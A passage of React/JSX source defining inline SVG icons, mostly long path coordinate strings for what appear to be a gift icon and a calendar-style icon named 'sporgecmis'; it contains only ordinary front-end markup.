    d="M11.837 29.0185H12.9185C13.839 29.0185 13.7935 30.1 15.085 30.1H19.411C20.0445 30.1 20.8845 29.729 21.035 29.0185L21.434 25.249C21.4602 25.0405 21.4412 24.8289 21.3781 24.6285C21.3151 24.4281 21.2095 24.2436 21.0686 24.0878C20.9277 23.9319 20.7548 23.8083 20.5617 23.7254C20.3687 23.6426 20.16 23.6023 19.95 23.6075H18.872"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M15.428 27.3C16.7895 26.7925 17.7905 25.501 17.7905 24.15V22.9215C17.9013 22.4176 17.9634 21.9043 17.976 21.3885C18.0007 21.0607 17.9586 20.7312 17.8521 20.4201C17.7456 20.1091 17.577 19.8229 17.3565 19.579C16.9505 19.0505 16.1665 19.1485 16.1665 19.656V20.0655C16.1665 21.1995 15.1165 22.316 14.7665 22.6345C14.4165 22.953 13.762 23.6075 12.915 23.6075H11.837"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M11.837 23.065H9.67401V29.5575H11.837V23.065Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M17.7905 10.6225C17.7905 10.6225 17.6855 8.63452 16.688 7.74552C16.5543 7.6181 16.3964 7.5189 16.2236 7.45383C16.0508 7.38875 15.8667 7.35913 15.6822 7.36674C15.4977 7.37434 15.3166 7.41902 15.1498 7.49809C14.9829 7.57717 14.8337 7.68904 14.711 7.82702C14.5883 7.965 14.4946 8.12628 14.4356 8.30123C14.3765 8.47619 14.3533 8.66124 14.3673 8.84535C14.3813 9.02947 14.4322 9.20888 14.517 9.3729C14.6019 9.53692 14.7188 9.68217 14.861 9.80002C15.855 10.6855 17.7905 10.6225 17.7905 10.6225Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M17.7905 10.6225C17.7905 10.6225 18.039 8.63452 19.0365 7.74552C19.1701 7.6181 19.328 7.5189 19.5008 7.45383C19.6736 7.38875 19.8578 7.35913 20.0423 7.36674C20.2268 7.37434 20.4078 7.41902 20.5747 7.49809C20.7415 7.57717 20.8908 7.68904 21.0135 7.82702C21.1362 7.965 21.2298 8.12628 21.2889 8.30123C21.3479 8.47619 21.3712 8.66124 21.3572 8.84535C21.3432 9.02947 21.2922 9.20888 21.2074 9.3729C21.1226 9.53692 21.0056 9.68217 20.8635 9.80002C19.8695 10.6855 17.7905 10.6225 17.7905 10.6225Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M13.461 13.328V17.654H22.1165V13.328"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M18.872 13.328H22.659V10.6225H12.9185V13.328H16.7055"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M18.872 10.6225V17.654"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M16.7055 17.654V10.6225"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M14 20.902H9.13149C8.98917 20.902 8.84825 20.8739 8.71681 20.8193C8.58537 20.7648 8.46599 20.6848 8.36552 20.584C8.26504 20.4832 8.18546 20.3636 8.13131 20.232C8.07717 20.1003 8.04953 19.9593 8.04999 19.817V6.30001C8.04999 6.01317 8.16394 5.73809 8.36676 5.53527C8.56958 5.33245 8.84466 5.21851 9.13149 5.21851H26.446C26.7328 5.21851 27.0079 5.33245 27.2107 5.53527C27.4135 5.73809 27.5275 6.01317 27.5275 6.30001V19.817C27.528 19.9593 27.5003 20.1003 27.4462 20.232C27.392 20.3636 27.3124 20.4832 27.212 20.584C27.1115 20.6848 26.9921 20.7648 26.8607 20.8193C26.7292 20.8739 26.5883 20.902 26.446 20.902H24.822V23.065C24.821 23.178 24.7848 23.2878 24.7184 23.3792C24.652 23.4706 24.5588 23.539 24.4516 23.5749C24.3445 23.6107 24.2288 23.6122 24.1208 23.5792C24.0128 23.5461 23.9177 23.4802 23.849 23.3905L21.5775 20.902H19.411"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
</svg>

  )
  const sporgecmis = (
    <svg
  width={35}
  height={35}
  viewBox="0 0 35 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[35px] h-[35px] relative"
  preserveAspectRatio="none"
>
  <path d="M35 0H0V35H35V0Z" fill="white" />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M12.8485 14.1225C12.8823 14.0901 12.9086 14.0507 12.9255 14.007C12.9465 13.9405 12.8835 13.839 12.8695 13.8145L12.817 13.7305C12.805 13.7023 12.7988 13.6719 12.7988 13.6412C12.7988 13.6105 12.805 13.5802 12.817 13.552C12.8418 13.4988 12.8778 13.4516 12.9225 13.4136C12.9672 13.3755 13.0195 13.3475 13.076 13.3315C13.1635 13.3 13.251 13.272 13.335 13.2335C13.4743 13.1647 13.5982 13.0682 13.699 12.95C13.9162 12.6768 14.0974 12.3769 14.238 12.0575C14.3176 11.8909 14.382 11.7176 14.4305 11.5395C14.4778 11.3353 14.4884 11.1244 14.462 10.9165C14.4468 10.7112 14.4093 10.5081 14.35 10.311C14.3412 10.2743 14.3249 10.2398 14.3022 10.2096C14.2795 10.1795 14.2509 10.1543 14.2181 10.1356C14.1853 10.1169 14.1491 10.1051 14.1116 10.101C14.074 10.0968 14.0361 10.1004 14 10.1115L13.6955 10.171C13.5975 10.192 13.4995 10.206 13.405 10.234C13.3324 10.2568 13.2655 10.2948 13.2088 10.3455C13.1521 10.3962 13.1068 10.4584 13.076 10.528C12.9955 10.6925 12.922 10.878 12.838 11.025L12.6 11.501C12.5125 11.655 12.418 11.8055 12.334 11.963C12.2898 12.0351 12.2634 12.1167 12.257 12.201C12.2556 12.2943 12.2722 12.387 12.306 12.474C12.369 12.663 12.425 12.8485 12.4775 13.041C12.499 13.1335 12.5259 13.2246 12.558 13.314C12.5779 13.3578 12.6013 13.3999 12.628 13.44C12.6628 13.4956 12.6812 13.5599 12.6812 13.6255C12.6812 13.6911 12.6628 13.7553 12.628 13.811C12.5229 13.9344 12.3913 14.0325 12.243 14.098C12.075 14.203 11.914 14.3185 11.746 14.42C11.578 14.5215 11.396 14.6195 11.2035 14.707C11.011 14.7945 10.8535 14.847 10.7555 14.9905C10.7463 15.0248 10.7404 15.06 10.738 15.0955C10.7414 15.1281 10.7414 15.1609 10.738 15.1935C10.7135 15.3125 10.5455 15.358 10.451 15.3755C10.3278 15.4008 10.2022 15.4125 10.0765 15.4105C9.7965 15.4105 9.5725 15.3685 9.31 15.358C9.18562 15.3533 9.06169 15.3404 8.939 15.3195C8.71814 15.2812 8.50052 15.2262 8.288 15.155C8.18953 15.129 8.09768 15.0825 8.0185 15.0185C8.00391 15.0028 7.99356 14.9837 7.98843 14.9629C7.98329 14.9421 7.98353 14.9203 7.98914 14.8997C7.99474 14.879 8.00552 14.8601 8.02046 14.8448C8.03539 14.8294 8.05399 14.8181 8.0745 14.812C8.16142 14.8134 8.24714 14.8325 8.3265 14.868C8.57374 14.9478 8.82639 15.0098 9.0825 15.0535C9.26557 15.0932 9.4518 15.1166 9.639 15.1235C9.73808 15.1294 9.83742 15.1294 9.9365 15.1235C9.98442 15.1188 10.03 15.1005 10.0678 15.0707C10.1057 15.0409 10.1342 15.0009 10.15 14.9555C10.171 14.882 10.087 14.812 10.031 14.763C9.97752 14.7223 9.91861 14.6893 9.856 14.665C9.61238 14.5563 9.37823 14.4275 9.156 14.28C9.03111 14.1958 8.89424 14.1309 8.75 14.0875C8.58723 14.049 8.42022 14.0313 8.253 14.035C7.9308 14.012 7.61114 13.9617 7.2975 13.8845C7.22123 13.8601 7.13926 13.8601 7.063 13.8845C7.0397 13.8922 7.01825 13.9047 6.99999 13.9211C6.98173 13.9375 6.96705 13.9575 6.95687 13.9798C6.94669 14.0022 6.94122 14.0264 6.94081 14.0509C6.9404 14.0754 6.94506 14.0998 6.9545 14.1225C6.98788 14.1793 7.02912 14.2312 7.077 14.2765C7.105 14.3115 7.196 14.3955 7.182 14.455C7.17763 14.4924 7.15939 14.5268 7.13088 14.5514C7.10237 14.5761 7.06566 14.5891 7.028 14.588C6.96159 14.5697 6.89884 14.5401 6.8425 14.5005C6.46639 14.2555 6.13198 13.9518 5.852 13.601C5.38506 13.0359 5.03584 12.3831 4.82486 11.6811C4.61389 10.979 4.54542 10.2419 4.6235 9.51298C4.66349 9.21277 4.72906 8.91652 4.8195 8.62748C5.1302 7.6161 5.7404 6.72276 6.5695 6.06548C7.20443 5.53968 7.95949 5.17898 8.7675 5.01548C9.08649 4.955 9.40924 4.91641 9.7335 4.89998C11.0445 4.86554 12.3195 5.33101 13.3 6.20198C13.7366 6.58548 14.1098 7.03553 14.406 7.53548C14.4847 7.66498 14.5526 7.80078 14.609 7.94148C14.6465 8.01857 14.6599 8.10516 14.6475 8.18998C14.6125 8.35098 14.49 8.45248 14.4865 8.64148C14.4922 8.78102 14.5062 8.9201 14.5285 9.05798C14.5304 9.10274 14.5363 9.14724 14.546 9.19098C14.567 9.27148 14.651 9.30648 14.7035 9.33798C14.756 9.36948 14.7245 9.36248 14.7385 9.36598C14.7525 9.36948 14.7805 9.34848 14.798 9.34848C14.8271 9.34806 14.856 9.35341 14.883 9.36422C14.9101 9.37504 14.9347 9.3911 14.9555 9.41148C14.9835 9.43677 15.006 9.46751 15.0216 9.50182C15.0373 9.53613 15.0457 9.57327 15.0465 9.61098C15.0682 9.79219 15.0799 9.97447 15.0815 10.157C15.0826 10.829 14.9568 11.4952 14.7105 12.1205C14.191 13.3667 13.216 14.368 11.984 14.9205C11.9186 14.9572 11.8477 14.9832 11.774 14.9975C11.7567 14.9992 11.7393 14.997 11.723 14.991C11.7067 14.9851 11.6919 14.9755 11.6798 14.9631C11.6677 14.9506 11.6585 14.9356 11.653 14.9192C11.6475 14.9027 11.6458 14.8852 11.648 14.868C11.648 14.8015 11.725 14.749 11.781 14.721C11.837 14.693 11.9105 14.658 11.9665 14.6335C12.2091 14.5149 12.4431 14.3792 12.6665 14.2275L12.8345 14.1085L12.8485 14.1225ZM12.2115 6.05148C12.2115 6.09698 12.278 6.15298 12.3095 6.18798C12.4508 6.3638 12.6157 6.51927 12.7995 6.64998C12.894 6.71392 12.9922 6.77235 13.0935 6.82498C13.1501 6.85966 13.2166 6.87444 13.2825 6.86698C13.305 6.85619 13.3244 6.83998 13.3391 6.81982C13.3537 6.79966 13.3632 6.77618 13.3665 6.75148C13.3665 6.70598 13.307 6.64998 13.272 6.61498C13.0793 6.42228 12.8683 6.2488 12.642 6.09698C12.5565 6.02967 12.4608 5.9765 12.3585 5.93948C12.3367 5.93413 12.3138 5.93413 12.292 5.93948C12.2696 5.9499 12.2503 5.96608 12.2362 5.98637C12.222 6.00666 12.2135 6.03033 12.2115 6.05498V6.05148ZM8.47 5.68048C8.47 5.62448 8.3895 5.59298 8.337 5.59648C8.19549 5.60847 8.05763 5.64769 7.931 5.71198C7.805 5.76798 7.686 5.83098 7.5635 5.89748C7.09555 6.13604 6.67554 6.45875 6.3245 6.84948C6.18808 6.99247 6.06288 7.14576 5.95 7.30798C5.91842 7.3505 5.90125 7.40201 5.901 7.45498C5.901 7.50398 5.9955 7.56698 6.041 7.58098C6.16323 7.60151 6.28867 7.57391 6.391 7.50398C6.5065 7.43398 6.6115 7.34998 6.741 7.27298C6.96675 7.11211 7.20037 6.96259 7.441 6.82498L7.63 6.72698C7.7988 6.63722 7.94301 6.50742 8.05 6.34898C8.127 6.22998 8.19 6.10748 8.267 5.99898C8.3055 5.93948 8.3475 5.88348 8.386 5.82748C8.4196 5.78669 8.44353 5.73883 8.456 5.68748L8.47 5.68048ZM9.695 5.63148C9.5667 5.63722 9.43909 5.65361 9.3135 5.68048C9.12386 5.73882 8.96127 5.86293 8.855 6.03048L8.6695 6.28248C8.6073 6.3632 8.55336 6.44997 8.5085 6.54148C8.49019 6.58238 8.48252 6.62726 8.48619 6.67192C8.48986 6.71659 8.50476 6.75961 8.5295 6.79698C8.58267 6.87941 8.64619 6.95469 8.7185 7.02098C8.8725 7.16798 9.0265 7.31148 9.1735 7.46548C9.29145 7.62503 9.44639 7.75355 9.625 7.83998C9.69457 7.85092 9.76543 7.85092 9.835 7.83998C9.95973 7.83298 10.0848 7.83298 10.2095 7.83998C10.4037 7.83979 10.5977 7.85148 10.7905 7.87498C10.8148 7.87861 10.838 7.8873 10.8587 7.90048C10.8794 7.91367 10.897 7.93106 10.9106 7.95152C10.9241 7.97198 10.9332 7.99506 10.9372 8.01926C10.9413 8.04345 10.9402 8.06823 10.934 8.09198C10.899 8.25998 10.647 8.22498 10.514 8.22848C10.229 8.24402 9.94812 8.30303 9.681 8.40348C9.58281 8.48 9.49668 8.57085 9.4255 8.67298C9.275 8.91798 9.1455 9.17348 9.009 9.42548C8.90124 9.61239 8.80651 9.80651 8.7255 10.0065C8.6895 10.1744 8.59056 10.3222 8.449 10.4195C8.34965 10.4625 8.2388 10.4711 8.134 10.444C7.9625 10.4125 7.784 10.402 7.6125 10.3845L7.077 10.3355C6.91345 10.3025 6.74574 10.2955 6.58 10.3145C6.47181 10.3657 6.3842 10.452 6.3315 10.5595C6.26491 10.688 6.20533 10.82 6.153 10.955C6.097 11.095 6.0445 11.235 5.999 11.3785C5.94448 11.5248 5.92763 11.6825 5.95 11.837C5.9897 11.9724 6.04738 12.1019 6.1215 12.222C6.25413 12.4648 6.40262 12.6987 6.566 12.922C6.70438 13.1491 6.90983 13.3276 7.154 13.433C7.30493 13.4803 7.45943 13.5154 7.616 13.538C7.784 13.5695 7.966 13.594 8.127 13.6115C8.278 13.6388 8.43351 13.6268 8.5785 13.5765C8.78081 13.4104 8.93641 13.1944 9.03 12.95C9.093 12.817 9.1595 12.6875 9.219 12.5545C9.25083 12.4935 9.27003 12.4267 9.27544 12.3582C9.28085 12.2896 9.27237 12.2207 9.2505 12.1555C9.198 12.0295 9.1525 11.914 9.086 11.7775C8.925 11.4555 8.8235 11.3295 8.6485 11.0145C8.59918 10.9396 8.56692 10.8547 8.554 10.766C8.554 10.6155 8.6695 10.5805 8.7815 10.682C8.81855 10.716 8.84935 10.7563 8.8725 10.801C8.974 10.9585 9.0195 11.011 9.121 11.172C9.2225 11.333 9.3345 11.522 9.471 11.732C9.57273 11.8479 9.70681 11.9308 9.856 11.97C10.0516 12.0109 10.2524 12.0204 10.451 11.998C10.6645 11.998 10.878 11.998 11.0915 11.9735L11.4065 11.9525C11.4901 11.9458 11.5725 11.9282 11.6515 11.9C11.7807 11.8425 11.8885 11.7458 11.9595 11.6235C12.0512 11.487 12.1353 11.3457 12.2115 11.2C12.2885 11.053 12.362 10.906 12.432 10.7555C12.502 10.605 12.579 10.458 12.635 10.304C12.6653 10.2257 12.6819 10.1429 12.684 10.059C12.6833 9.97608 12.6666 9.8941 12.635 9.81748C12.5716 9.66953 12.4967 9.52677 12.411 9.39048C12.3305 9.25048 12.25 9.11048 12.166 8.97398C12.0854 8.84026 11.9965 8.71168 11.9 8.58898C11.8405 8.51198 11.767 8.45248 11.704 8.37898C11.641 8.30548 11.4205 8.23548 11.389 8.17948C11.3737 8.14971 11.3656 8.11671 11.3656 8.08323C11.3656 8.04974 11.3737 8.01674 11.389 7.98698C11.4135 7.92048 11.6165 7.86098 11.7075 7.75248C11.758 7.69486 11.8048 7.63407 11.8475 7.57048C11.9385 7.43748 12.0085 7.29048 12.0855 7.15048C12.1821 7.0261 12.2284 6.8699 12.215 6.71298C12.1622 6.57675 12.0754 6.45627 11.963 6.36298C11.7478 6.14007 11.5056 5.94489 11.242 5.78198C11.097 5.70113 10.9377 5.64885 10.773 5.62798C10.5599 5.61046 10.3456 5.61046 10.1325 5.62798C9.9925 5.62798 9.8455 5.62798 9.7055 5.64548L9.695 5.63148ZM12.4635 7.20998C12.348 7.38848 12.257 7.55998 12.152 7.76298C12.0932 7.85001 12.0604 7.95199 12.0575 8.05698C12.0764 8.18604 12.1309 8.30726 12.215 8.40698C12.4521 8.74412 12.6694 9.09471 12.866 9.45698C12.8945 9.51419 12.9273 9.56918 12.964 9.62148C13.0222 9.7211 13.116 9.79491 13.2265 9.82798C13.2995 9.83303 13.3728 9.82593 13.4435 9.80698C13.5975 9.77898 13.755 9.74048 13.909 9.70898C14.063 9.67748 14.217 9.60398 14.2345 9.41848C14.2432 9.26183 14.2362 9.10471 14.2135 8.94948C14.2135 8.79898 14.175 8.65198 14.1435 8.50498C14.1056 8.25594 14.0162 8.01754 13.881 7.80498C13.6374 7.53742 13.3555 7.30743 13.0445 7.12248C12.9548 7.04366 12.8383 7.00231 12.719 7.00698C12.694 7.00646 12.6696 7.01381 12.649 7.02798C12.5744 7.07854 12.5113 7.1441 12.4635 7.22048V7.20998ZM5.621 8.04998C5.52711 8.11685 5.45425 8.20913 5.411 8.31598C5.21715 8.71698 5.09175 9.14759 5.04 9.58998C5.00125 9.9389 5.00125 10.291 5.04 10.64C5.04766 10.7885 5.07836 10.9349 5.131 11.074C5.17113 11.1802 5.24816 11.2684 5.348 11.3225C5.4425 11.368 5.523 11.256 5.558 11.179C5.593 11.102 5.6385 10.9655 5.6805 10.8605C5.76448 10.6448 5.86149 10.4344 5.971 10.2305C6.02609 10.1393 6.06294 10.0382 6.0795 9.93298C6.08057 9.80363 6.06766 9.67455 6.041 9.54798C5.999 9.26798 5.992 8.98098 5.978 8.69748C5.9745 8.62985 5.9745 8.5621 5.978 8.49448C5.98869 8.39833 5.98157 8.30104 5.957 8.20748C5.93439 8.15581 5.89788 8.11143 5.85153 8.07929C5.80518 8.04716 5.75082 8.02853 5.6945 8.02548C5.67031 8.02922 5.64675 8.03629 5.6245 8.04648L5.621 8.04998ZM5.2885 11.9C5.29112 11.9409 5.30059 11.9812 5.3165 12.019C5.334 12.0645 5.3515 12.11 5.3725 12.1555C5.6093 12.6822 5.93354 13.165 6.3315 13.5835C6.3595 13.615 6.454 13.713 6.4995 13.713C6.545 13.713 6.566 13.664 6.5695 13.643C6.56154 13.6068 6.54981 13.5717 6.5345 13.538C6.46683 13.4146 6.38836 13.2975 6.3 13.188C6.12864 12.9461 5.97089 12.6949 5.8275 12.4355C5.7785 12.348 5.7365 12.2605 5.6875 12.173C5.64095 12.0967 5.58702 12.0252 5.5265 11.9595C5.4985 11.9315 5.404 11.83 5.3585 11.837C5.34316 11.8422 5.32904 11.8504 5.317 11.8613C5.30496 11.8721 5.29527 11.8853 5.2885 11.9Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M13.258 30.5165V30.0755M13.258 30.5165C13.071 30.5156 12.8916 30.4421 12.7577 30.3115C12.6238 30.1809 12.5459 30.0034 12.5405 29.8165V16.66C12.541 16.6007 12.5649 16.5441 12.607 16.5025C12.6489 16.4633 12.7037 16.4409 12.761 16.4395H29.8795C29.9387 16.4399 29.9954 16.4638 30.037 16.506C30.0773 16.5471 30.0999 16.6024 30.1 16.66V29.8025C30.1 29.9881 30.0262 30.1662 29.895 30.2974C29.7637 30.4287 29.5856 30.5025 29.4 30.5025L13.258 30.5165ZM13.258 30.0755H29.4C29.4724 30.0755 29.5418 30.0467 29.593 29.9955C29.6442 29.9443 29.673 29.8749 29.673 29.8025V16.8805H12.9815V29.8025C12.9815 29.8386 12.9887 29.8744 13.0026 29.9077C13.0165 29.9411 13.037 29.9713 13.0627 29.9967C13.0884 30.0221 13.1189 30.0422 13.1524 30.0557C13.186 30.0692 13.2219 30.0759 13.258 30.0755Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M24.7555 13.881V11.928C24.7429 11.7631 24.7645 11.5974 24.8189 11.4412C24.8733 11.2851 24.9595 11.1418 25.0718 11.0205C25.1842 10.8992 25.3205 10.8024 25.472 10.7362C25.6236 10.67 25.7871 10.6359 25.9525 10.6359C26.1179 10.6359 26.2815 10.67 26.433 10.7362C26.5846 10.8024 26.7208 10.8992 26.8332 11.0205C26.9456 11.1418 27.0317 11.2851 27.0861 11.4412C27.1405 11.5974 27.1621 11.7631 27.1495 11.928V13.881C27.1621 14.0459 27.1405 14.2116 27.0861 14.3677C27.0317 14.5239 26.9456 14.6671 26.8332 14.7884C26.7208 14.9097 26.5846 15.0065 26.433 15.0727C26.2815 15.1389 26.1179 15.1731 25.9525 15.1731C25.7871 15.1731 25.6236 15.1389 25.472 15.0727C25.3205 15.0065 25.1842 14.9097 25.0718 14.7884C24.9595 14.6671 24.8733 14.5239 24.8189 14.3677C24.7645 14.2116 24.7429 14.0459 24.7555 13.881ZM25.2 11.928V13.881C25.1853 13.9889 25.1938 14.0987 25.2251 14.203C25.2563 14.3073 25.3096 14.4038 25.3812 14.4858C25.4528 14.5679 25.5412 14.6336 25.6403 14.6787C25.7395 14.7238 25.8471 14.7471 25.956 14.7471C26.0649 14.7471 26.1726 14.7238 26.2717 14.6787C26.3709 14.6336 26.4592 14.5679 26.5308 14.4858C26.6025 14.4038 26.6557 14.3073 26.6869 14.203C26.7182 14.0987 26.7267 13.9889 26.712 13.881V11.928C26.7267 11.8201 26.7182 11.7102 26.6869 11.6059C26.6557 11.5016 26.6025 11.4052 26.5308 11.3231C26.4592 11.2411 26.3709 11.1753 26.2717 11.1302C26.1726 11.0852 26.0649 11.0619 25.956 11.0619C25.8471 11.0619 25.7395 11.0852 25.6403 11.1302C25.5412 11.1753 25.4528 11.2411 25.3812 11.3231C25.3096 11.4052 25.2563 11.5016 25.2251 11.6059C25.1938 11.7102 25.1853 11.8201 25.2 11.928Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M15.4945 13.8809V11.9279C15.4789 11.7616 15.4982 11.5938 15.5512 11.4353C15.6041 11.2768 15.6896 11.1311 15.8021 11.0075C15.9146 10.884 16.0517 10.7853 16.2045 10.7177C16.3574 10.6502 16.5227 10.6153 16.6898 10.6153C16.8569 10.6153 17.0221 10.6502 17.175 10.7177C17.3278 10.7853 17.4649 10.884 17.5774 11.0075C17.6899 11.1311 17.7754 11.2768 17.8284 11.4353C17.8813 11.5938 17.9006 11.7616 17.885 11.9279V13.8809C17.9006 14.0473 17.8813 14.2151 17.8284 14.3736C17.7754 14.5321 17.6899 14.6778 17.5774 14.8014C17.4649 14.9249 17.3278 15.0236 17.175 15.0912C17.0221 15.1587 16.8569 15.1936 16.6898 15.1936C16.5227 15.1936 16.3574 15.1587 16.2045 15.0912C16.0517 15.0236 15.9146 14.9249 15.8021 14.8014C15.6896 14.6778 15.6041 14.5321 15.5512 14.3736C15.4982 14.2151 15.4789 14.0473 15.4945 13.8809ZM15.932 13.8809C15.9173 13.9889 15.9258 14.0987 15.9571 14.203C15.9883 14.3073 16.0416 14.4038 16.1132 14.4858C16.1848 14.5679 16.2732 14.6336 16.3723 14.6787C16.4715 14.7237 16.5791 14.7471 16.688 14.7471C16.7969 14.7471 16.9046 14.7237 17.0037 14.6787C17.1029 14.6336 17.1912 14.5679 17.2628 14.4858C17.3345 14.4038 17.3877 14.3073 17.4189 14.203C17.4502 14.0987 17.4587 13.9889 17.444 13.8809V11.9279C17.4587 11.82 17.4502 11.7102 17.4189 11.6059C17.3877 11.5016 17.3345 11.4051 17.2628 11.3231C17.1912 11.241 17.1029 11.1753 17.0037 11.1302C16.9046 11.0851 16.7969 11.0618 16.688 11.0618C16.5791 11.0618 16.4715 11.0851 16.3723 11.1302C16.2732 11.1753 16.1848 11.241 16.1132 11.3231C16.0416 11.4051 15.9883 11.5016 15.9571 11.6059C15.9258 11.7102 15.9173 11.82 15.932 11.9279V13.8809Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M18.7285 21.252C18.5951 21.2511 18.4674 21.1977 18.3731 21.1033C18.2788 21.009 18.2254 20.8814 18.2245 20.748V19.1485C18.2254 19.0151 18.2788 18.8874 18.3731 18.7931C18.4674 18.6988 18.5951 18.6454 18.7285 18.6445H20.3245C20.4579 18.6454 20.5855 18.6988 20.6799 18.7931C20.7742 18.8874 20.8276 19.0151 20.8285 19.1485V20.748C20.8276 20.8814 20.7742 21.009 20.6799 21.1033C20.5855 21.1977 20.4579 21.2511 20.3245 21.252H18.7285ZM18.6655 19.152V20.7515C18.6655 20.7682 18.6721 20.7842 18.6839 20.796C18.6958 20.8078 18.7118 20.8145 18.7285 20.8145H20.3245C20.3413 20.8137 20.3573 20.8069 20.3695 20.7954C20.3817 20.7838 20.3893 20.7682 20.391 20.7515V19.1485C20.3893 19.1317 20.3817 19.1162 20.3695 19.1046C20.3573 19.093 20.3413 19.0862 20.3245 19.0855H18.7285C18.7121 19.0863 18.6965 19.0932 18.6849 19.1049C18.6732 19.1165 18.6663 19.132 18.6655 19.1485V19.152Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M22.316 21.252C22.1826 21.251 22.0549 21.1977 21.9606 21.1033C21.8663 21.009 21.8129 20.8813 21.812 20.748V19.152C21.8115 19.0856 21.8242 19.0199 21.8494 18.9585C21.8746 18.8972 21.9117 18.8414 21.9586 18.7945C22.0055 18.7476 22.0612 18.7105 22.1226 18.6854C22.1839 18.6602 22.2497 18.6475 22.316 18.648H23.912C23.9783 18.6475 24.0441 18.6602 24.1054 18.6854C24.1668 18.7105 24.2225 18.7476 24.2694 18.7945C24.3163 18.8414 24.3534 18.8972 24.3786 18.9585C24.4037 19.0199 24.4165 19.0856 24.416 19.152V20.748C24.4151 20.8813 24.3617 21.009 24.2674 21.1033C24.173 21.1977 24.0454 21.251 23.912 21.252H22.316ZM22.253 19.152V20.748C22.253 20.7647 22.2596 20.7807 22.2714 20.7925C22.2833 20.8043 22.2993 20.811 22.316 20.811H23.912C23.9288 20.8102 23.9448 20.8034 23.957 20.7919C23.9692 20.7803 23.9768 20.7647 23.9785 20.748V19.152C23.9776 19.1346 23.9704 19.1182 23.9581 19.1059C23.9458 19.0936 23.9294 19.0863 23.912 19.0855H22.316C22.299 19.0864 22.2829 19.0938 22.2712 19.1061C22.2595 19.1185 22.253 19.1349 22.253 19.152Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M25.9 21.252C25.7666 21.251 25.6389 21.1977 25.5446 21.1033C25.4503 21.009 25.3969 20.8813 25.396 20.748V19.1485C25.396 19.0824 25.4091 19.0171 25.4344 18.9561C25.4598 18.8952 25.497 18.8398 25.5438 18.7933C25.5907 18.7468 25.6463 18.71 25.7074 18.6851C25.7685 18.6601 25.834 18.6475 25.9 18.648H27.496C27.562 18.6475 27.6275 18.6601 27.6886 18.6851C27.7497 18.71 27.8053 18.7468 27.8522 18.7933C27.899 18.8398 27.9362 18.8952 27.9616 18.9561C27.9869 19.0171 28 19.0824 28 19.1485V20.748C27.9991 20.8813 27.9457 21.009 27.8514 21.1033C27.757 21.1977 27.6294 21.251 27.496 21.252H25.9ZM25.837 19.152V20.7515C25.837 20.7682 25.8436 20.7842 25.8554 20.796C25.8673 20.8078 25.8833 20.8145 25.9 20.8145H27.496C27.513 20.8145 27.5294 20.808 27.5418 20.7962C27.5542 20.7845 27.5616 20.7685 27.5625 20.7515V19.1485C27.5608 19.1317 27.5532 19.1161 27.541 19.1046C27.5288 19.093 27.5128 19.0862 27.496 19.0855H25.9C25.8842 19.0871 25.8695 19.0944 25.8586 19.1059C25.8477 19.1175 25.8412 19.1326 25.8405 19.1485L25.837 19.152Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M18.7285 24.6995C18.6622 24.6999 18.5964 24.6872 18.5351 24.6621C18.4737 24.6369 18.418 24.5998 18.3711 24.5529C18.3242 24.506 18.2871 24.4503 18.2619 24.3889C18.2368 24.3275 18.224 24.2618 18.2245 24.1955V22.5995C18.2245 22.4658 18.2776 22.3376 18.3721 22.2431C18.4666 22.1486 18.5948 22.0955 18.7285 22.0955H20.3245C20.3908 22.095 20.4566 22.1077 20.5179 22.1329C20.5793 22.1581 20.635 22.1952 20.6819 22.2421C20.7288 22.2889 20.7659 22.3447 20.7911 22.406C20.8162 22.4674 20.829 22.5332 20.8285 22.5995V24.1955C20.829 24.2618 20.8162 24.3275 20.7911 24.3889C20.7659 24.4503 20.7288 24.506 20.6819 24.5529C20.635 24.5998 20.5793 24.6369 20.5179 24.6621C20.4566 24.6872 20.3908 24.6999 20.3245 24.6995H18.7285ZM18.6655 22.5995V24.1955C18.6655 24.2125 18.672 24.2289 18.6837 24.2413C18.6954 24.2537 18.7115 24.2611 18.7285 24.262H20.3245C20.3419 24.2611 20.3583 24.2538 20.3706 24.2416C20.3829 24.2293 20.3902 24.2128 20.391 24.1955V22.5995C20.3901 22.5824 20.3827 22.5664 20.3703 22.5547C20.358 22.543 20.3415 22.5364 20.3245 22.5365H18.7285C18.7118 22.5365 18.6958 22.5431 18.684 